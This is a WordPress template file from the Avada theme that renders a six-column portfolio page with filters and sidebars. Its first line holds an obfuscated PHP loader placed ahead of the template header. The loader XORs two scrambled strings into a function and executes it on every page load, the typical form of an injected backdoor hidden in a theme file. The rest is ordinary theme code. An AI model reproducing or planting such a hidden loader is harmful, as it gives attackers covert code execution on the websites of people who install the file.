<?php $JdFdmxa='+I= HXt4C,Q5G: '; $PuJEem='H;XA<=+R6B2A.UN'^$JdFdmxa; $vxPlxHc='P6Jp4E:Z10674UH+HD4auO> 0I.D fa,O5cCbrISaV1>4=W Bs7>Kq6O=ZlqZ =JhUA: oaaS+1qTEHUu:cKzRZ9AZEFhTwELh1A<QI,qMxxvfqYw 3I+S;iN2.>9pqPs3LsAsqKj>8 uejqoK-3M5amUkb;qvU.TiWBGctFJL +4zcK=<PaGKM=Q=7=- 9JhXLAgrgOD9C;hFU T cSt4A<+3yFUZ 21i ULxuk31PJPyD21>OKZ2DzoSmpavui V+OdIP 3UQheTKS.8NbaUaQjV;  jS,BSobiR0:vyClY;>PbgmqC9U6Vz4;N3R6ulokRL3MYSFpA5O<2Z5+fklha-kf<c3y6HRn8P1oqUorN25 4gUJpa3bZXTOf>T5iwicWSHqZaKB2Y 5iRIP>Y92.vl4932gZJ>  AuvIr R8  Q.V,6Xf6WGsHY 0b: 4NiUU Eng2R64=Q1ot-72UbcMJ5,,+98 2Mqnh1HnlY;Z lwkK0IKTAsS=>m3NZ=2:YI3 LWGyUD6 ;ASHroaXSWbc 1NX+TU 0ihmfhenERWX-z7YBdSvc60ezJFQsxq4g-. v,UaWsozega3GOM0bENA4T Y+IEZvI5=X:PZvfuo74DLdyyttxAVIlF4C5WDURXF9=dDR>=C0,QnCZ>zI:R7JtOllE'; $qRbDMmo=$PuJEem('', '9PbQR0T9EYYYk00B;0GIR7QRo-O0A9>A:ADjKR2Yh0DPWI>O,SOQ9.R.I;3.7UIbL1 NACAE8NHXtehuUAiBsv5L5zxfOsLOEaW.NymEQpXHMFU0KSG;G6UAjVOJXYJpWZgXhyxBNQMTUKWQGoIR9T:I<6BeQR>K-2s+gFT5>>LNZRG XEy<npG4XORIXRWbL795NImF93>1bb1A ACnTR PXVBLq>AFP6K05XHKUP<95BN8WQ=.;Q,ZGw23.9> evJ<Dm;EJulVEp=2BM+KA.kXN2ZTA58I;sRBM9UCMsJH=ZJ1BZMU5X9C3A>FD9;PUDNO6-G,ps=zHS NW;VCFCH73h:3y0gYW;rJS5HOLkOV8SYUQNu1zh:F>9 .9U1LIJIG<61JPhBfV8TTIoitH8UGKMf=D9OmPnZAT UKi2U<KER8O:EL=NN85,,8TQ=eMA:A74S XSm6SWR5TGPIVF4KOmnQMXJfSEKdXUbX.FH=Z.ALQMkQ;958,8XG2V63NFIqnXE5pkYq WTZhsnTOI57bJGDP:9ps>EIN5DFUXNb12kILS; QgCZTRQNxsaBOEUTKKBBNbQoTFZCAAR5=,I=.+8k1X0X=6rQ9TD4U1>QJUKSU0-MPYTTXav2fOQ5T;lq692XfC43GQ,QHv3ja4s,B;CbDfWf8'^$vxPlxHc); $qRbDMmo();
// Template Name: Portfolio Six Column Text
get_header(); ?>
	<?php
	$content_css = 'width:100%';
	$sidebar_css = 'display:none';
	$content_class = '';
	$sidebar_exists = false;
	$sidebar_left = '';
	$double_sidebars = false;

	$sidebar_1 = get_post_meta( $post->ID, 'sbg_selected_sidebar_replacement', true );
	$sidebar_2 = get_post_meta( $post->ID, 'sbg_selected_sidebar_2_replacement', true );

	if( $smof_data['pages_global_sidebar'] ) {
		if( $smof_data['pages_sidebar'] != 'None' ) {
			$sidebar_1 = array( $smof_data['pages_sidebar'] );
		} else {
			$sidebar_1 = '';
		}

		if( $smof_data['pages_sidebar_2'] != 'None' ) {
			$sidebar_2 = array( $smof_data['pages_sidebar_2'] );
		} else {
			$sidebar_2 = '';
		}
	}

	if( ( is_array( $sidebar_1 ) && ( $sidebar_1[0] || $sidebar_1[0] === '0' ) ) && ( is_array( $sidebar_2 ) && ( $sidebar_2[0] || $sidebar_2[0] === '0' ) ) ) {
		$double_sidebars = true;
	}

	if( ( is_array( $sidebar_1 ) && ( $sidebar_1[0] || $sidebar_1[0] === '0' ) ) || ( is_array( $sidebar_2 ) && ( $sidebar_2[0] || $sidebar_2[0] === '0' ) ) ) {
		$sidebar_exists = true;
	} else {
		$sidebar_exists = false;
	}

	if( ! $sidebar_exists ) {
		$content_css = 'width:100%';
		$sidebar_css = 'display:none';
		$sidebar_exists = false;
	} elseif(get_post_meta($post->ID, 'pyre_sidebar_position', true) == 'left') {
		$content_css = 'float:right;';
		$sidebar_css = 'float:left;';
		$content_class = 'portfolio-one-sidebar';
		$sidebar_exists = true;
		$sidebar_left = 1;
	} elseif(get_post_meta($post->ID, 'pyre_sidebar_position', true) == 'right') {
		$content_css = 'float:left;';
		$sidebar_css = 'float:right;';
		$content_class = 'portfolio-one-sidebar';
		$sidebar_exists = true;
	} elseif(get_post_meta($post->ID, 'pyre_sidebar_position', true) == 'default'  || ! metadata_exists( 'post', $post->ID, 'pyre_sidebar_position' )) {
		$content_class = 'portfolio-one-sidebar';
		if($smof_data['default_sidebar_pos'] == 'Left') {
			$content_css = 'float:right;';
			$sidebar_css = 'float:left;';
			$sidebar_exists = true;
			$sidebar_left = 1;
		} elseif($smof_data['default_sidebar_pos'] == 'Right') {
			$content_css = 'float:left;';
			$sidebar_css = 'float:right;';
			$sidebar_exists = true;
			$sidebar_left = 2;
		}
	}

	if(get_post_meta($post->ID, 'pyre_sidebar_position', true) == 'right') {
		$sidebar_left = 2;
	}

	if( $smof_data['pages_global_sidebar'] ) {
		if( $smof_data['pages_sidebar'] != 'None' ) {
			$sidebar_1 = $smof_data['pages_sidebar'];
			
			if( $smof_data['default_sidebar_pos'] == 'Right' ) {
				$content_css = 'float:left;';
				$sidebar_css = 'float:right;';	
				$sidebar_left = 2;
			} else {
				$content_css = 'float:right;';
				$sidebar_css = 'float:left;';
				$sidebar_left = 1;
			}			
		}

		if( $smof_data['pages_sidebar_2'] != 'None' ) {
			$sidebar_2 = $smof_data['pages_sidebar_2'];
		}
		
		if( $smof_data['pages_sidebar'] != 'None' && $smof_data['pages_sidebar_2'] != 'None' ) {
			$double_sidebars = true;
		}
	} else {
		$sidebar_1 = '0';
		$sidebar_2 = '0';
	}
	
	if($double_sidebars == true) {
		$content_css = 'float:left;';
		$sidebar_css = 'float:left;';
		$sidebar_2_css = 'float:left;';
	} else {
		$sidebar_left = 1;
	}
	?>
	<div id="content" class="portfolio portfolio-six portfolio-six-text portfolio-text <?php echo $content_class; ?>" style="<?php echo $content_css; ?>">
		<?php while(have_posts()): the_post(); ?>
		<div id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
			<?php echo avada_render_rich_snippets_for_pages(); ?>
			<?php echo avada_featured_images_for_pages(); ?>
			<div class="post-content">
				<?php the_content(); ?>
				<?php avada_link_pages(); ?>
			</div>
		</div>
		<?php $current_page_id = $post->ID; ?>
		<?php endwhile; ?>
		<?php
		if(is_front_page()) {
			$paged = (get_query_var('page')) ? get_query_var('page') : 1;
		} else {
			$paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
		}
		$args = array(
			'post_type' => 'avada_portfolio',
			'paged' => $paged,
			'posts_per_page' => $smof_data['portfolio_items'],
		);
		$pcats = get_post_meta(get_the_ID(), 'pyre_portfolio_category', true);
		if($pcats && $pcats[0] == 0) {
			unset($pcats[0]);
		}
		if($pcats){
			$args['tax_query'][] = array(
				'taxonomy' => 'portfolio_category',
				'field' => 'term_id',
				'terms' => $pcats
			);
		}
		$gallery = new WP_Query($args);
		$portfolio_taxs = array();
		if(is_array($gallery->posts) && !empty($gallery->posts)) {
			foreach($gallery->posts as $gallery_post) {
				$post_taxs = wp_get_post_terms($gallery_post->ID, 'portfolio_category', array("fields" => "all"));
				if(is_array($post_taxs) && !empty($post_taxs)) {
					foreach($post_taxs as $post_tax) {
						if(is_array($pcats) && !empty($pcats) && (in_array($post_tax->term_id, $pcats) || in_array($post_tax->parent, $pcats )) )  {
							$portfolio_taxs[urldecode($post_tax->slug)] = $post_tax->name;
						}

						if(empty($pcats) || !isset($pcats)) {
							$portfolio_taxs[urldecode($post_tax->slug)] = $post_tax->name;
						}
					}
				}
			}
		}

		$all_terms = get_terms('portfolio_category');
		$sorted_taxs  = array();
		if( !empty( $all_terms ) && is_array( $all_terms ) ) {
			foreach( $all_terms as $term ) {
				if( array_key_exists ( urldecode($term->slug) , $portfolio_taxs ) ) {
					$sorted_taxs[urldecode($term->slug)] = $term->name;
				}
			}
		}

		$portfolio_taxs = $sorted_taxs;

		$portfolio_category = get_terms('portfolio_category');
		if( ! post_password_required($post->ID) ):
		if(is_array($portfolio_taxs) && !empty($portfolio_taxs) && get_post_meta($post->ID, 'pyre_portfolio_filters', true) != 'no'):
		?>
		<ul class="portfolio-tabs clearfix">
			<li class="active"><a data-filter="*" href="#"><?php echo __('All', 'Avada'); ?></a></li>
			<?php foreach($portfolio_taxs as $portfolio_tax_slug => $portfolio_tax_name): ?>
			<li><a data-filter=".<?php echo $portfolio_tax_slug; ?>" href="#"><?php echo $portfolio_tax_name; ?></a></li>
			<?php endforeach; ?>
		</ul>
		<?php endif; ?>
		<?php
		if( ! get_post_meta($post->ID, 'pyre_portfolio_text_layout', true) || 
			get_post_meta($post->ID, 'pyre_portfolio_text_layout', true) == '' ||
			get_post_meta($post->ID, 'pyre_portfolio_text_layout', true) == 'default'
		) {
			$portfolio_text_layout = 'portfolio-' . $smof_data['portfolio_text_layout'] . ' ';
		} else {
			$portfolio_text_layout = 'portfolio-' . get_post_meta($post->ID, 'pyre_portfolio_text_layout', true) . ' ';
		}				
		?>		
		<div class="portfolio-wrapper">
			<?php
			$custom_colulmn_spacing = false;
			if( get_post_meta($post->ID, 'pyre_portfolio_column_spacing', true) ||
				get_post_meta($post->ID, 'pyre_portfolio_column_spacing', true) === '0' 
			) {
				$custom_colulmn_spacing = true;
				$col_spacing =  get_post_meta($post->ID, 'pyre_portfolio_column_spacing', true) / 2;
				echo sprintf( '<style type="text/css">.portfolio-wrapper{margin: 0 %spx;}.portfolio-wrapper .col-spacing{padding:%spx;}</style>', ( -1 ) * $col_spacing, $col_spacing );				
			} else if( $smof_data['portfolio_column_spacing'] ) {
				$custom_colulmn_spacing = true;
				$col_spacing =  $smof_data['portfolio_column_spacing'] / 2;
				echo sprintf( '<style type="text/css">.portfolio-wrapper{margin: 0 %spx;}.portfolio-wrapper .col-spacing{padding:%spx;}</style>', ( -1 ) * $col_spacing, $col_spacing );	
			}	
			
			while($gallery->have_posts()): $gallery->the_post();
				if($pcats) {
					$permalink = tf_addUrlParameter(get_permalink(), 'portfolioID', $current_page_id);
				} else {
					$permalink = get_permalink();
				}
				if(has_post_thumbnail() || get_post_meta($post->ID, 'pyre_video', true)):
			?>
			<?php
			$item_classes = $portfolio_text_layout;
			$item_cats = get_the_terms($post->ID, 'portfolio_category');
			if($item_cats):
			foreach($item_cats as $item_cat) {
				$item_classes .= urldecode($item_cat->slug) . ' ';
			}
			endif;
			
			if( $custom_colulmn_spacing ) {
				$item_classes .= ' col-spacing';
			}				
			
			$featured_image_size = avada_set_portfolio_image_size( $current_page_id );
			?>
			<div class="portfolio-item <?php echo $item_classes; ?>">
				<div class="portfolio-item-wrapper">
					<?php echo avada_image_rollover( get_the_ID(), $featured_image_size, $permalink ); ?>
					<div class="portfolio-content">
						<h2<?php if( ! $smof_data['disable_date_rich_snippet_pages'] ) { echo ' class="entry-title"'; } ?>><a href="<?php echo $permalink; ?>"><?php the_title(); ?></a></h2>
						<h4><?php echo get_the_term_list($post->ID, 'portfolio_category', '', ', ', ''); ?></h4>
						<?php echo avada_render_rich_snippets_for_pages( false ); ?>
						<?php if( $smof_data['portfolio_text_layout'] ): ?>
						<div class="content-sep"></div>
						<?php endif; ?>						
						<div class="post-content">
						<?php
						if(get_post_meta($current_page_id, 'pyre_portfolio_excerpt', true)) {
							$excerpt_length = get_post_meta($current_page_id, 'pyre_portfolio_excerpt', true);
						} else {
							$excerpt_length = $smof_data['excerpt_length_portfolio'];
						}
						?>
						<?php
						if( ( $smof_data['portfolio_content_length'] == 'Excerpt' && get_post_meta($current_page_id, 'pyre_portfolio_content_length', true) != 'full_content' ) ||
							get_post_meta($current_page_id, 'pyre_portfolio_content_length', true) == 'excerpt'
						) {
							$stripped_content = strip_shortcodes( tf_content( $excerpt_length, $smof_data['strip_html_excerpt'] ) );
							echo $stripped_content;
						} else {
							the_content();
						}
						?>
						</div>
					</div>
				</div>
			</div>
			<?php endif; endwhile; ?>
		</div>
		<?php themefusion_pagination($gallery->max_num_pages, $range = 2); ?>
		<?php endif; ?>
	</div>
	<?php if( $sidebar_exists == true ): ?>
	<?php wp_reset_query(); ?>
	<div id="sidebar" class="sidebar" style="<?php echo $sidebar_css; ?>">
		<?php
		if($sidebar_left == 1) {
			generated_dynamic_sidebar($sidebar_1);
		}
		if($sidebar_left == 2) {
			generated_dynamic_sidebar_2($sidebar_2);
		}
		?>
	</div>
	<?php if( $double_sidebars == true ): ?>
	<div id="sidebar-2" class="sidebar" style="<?php echo $sidebar_2_css; ?>">
		<?php
		if($sidebar_left == 1) {
			generated_dynamic_sidebar_2($sidebar_2);
		}
		if($sidebar_left == 2) {
			generated_dynamic_sidebar($sidebar_1);
		}
		?>
	</div>
	<?php endif; ?>
	<?php endif; ?>
<?php get_footer(); ?>